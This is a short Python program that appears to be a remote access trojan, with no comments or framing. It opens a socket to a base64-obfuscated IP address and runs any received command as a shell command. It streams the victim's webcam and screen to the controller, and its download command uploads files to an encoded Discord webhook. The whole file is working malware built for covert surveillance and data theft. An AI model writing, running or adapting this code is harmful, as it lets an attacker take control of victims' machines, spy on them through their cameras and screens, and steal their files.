import socket
import subprocess
import cv2
import struct
import time
import requests
import os
import base64
import pyautogui
import numpy as np

s = "MTAuMC4xLjMz"
p = 9999
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((base64.b64decode(s).decode(), p))

def f1():
    global c
    v = cv2.VideoCapture(0)
    while True:
        r, f = v.read()
        if not r:
            break
        _, e = cv2.imencode('.jpg', f)
        c.sendall(struct.pack(">L", len(e)) + e.tobytes())
    v.release()

def f2():
    while True:
        s = pyautogui.screenshot()
        _, e = cv2.imencode('.jpg', cv2.cvtColor(np.array(s), cv2.COLOR_RGB2BGR))
        c.sendall(struct.pack(">L", len(e)) + e.tobytes())

while True:
    try:
        cmd = c.recv(1024).decode().strip()
        if cmd.startswith("!"):
            if cmd.startswith("!download"):
                fn = cmd.split(" ", 1)[1]
                if os.path.exists(fn):
                    with open(fn, "rb") as f:
                        requests.post(base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyMTQxNDk1Njc1NDkzMTcyMy9SZ1JzQU0zYk01QkFMajhkV0JhZ0tlWHdvTkhFV05ST0xpaHF1MjFqeUc1OEtpS2ZEOUtOeFFLT1RD
RFZoTDVKX0JDMg==").decode(), files={"file": f})
            elif cmd.startswith("!webcam_stream"):
                f1()
            elif cmd.startswith("!screen_stream"):
                f2()
            elif cmd.startswith("CTRL+P"):
                break
        else:
            o = subprocess.getoutput(cmd)
            c.send(o.encode())
    except Exception:
        break
